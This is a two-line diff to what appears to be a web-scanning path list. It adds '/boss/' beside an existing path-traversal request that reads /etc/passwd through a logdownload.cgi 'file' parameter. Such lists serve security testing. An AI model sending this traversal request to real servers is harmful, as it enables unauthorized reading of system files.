@@ -1,1 +1,2 @@
 /usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd
+/boss/
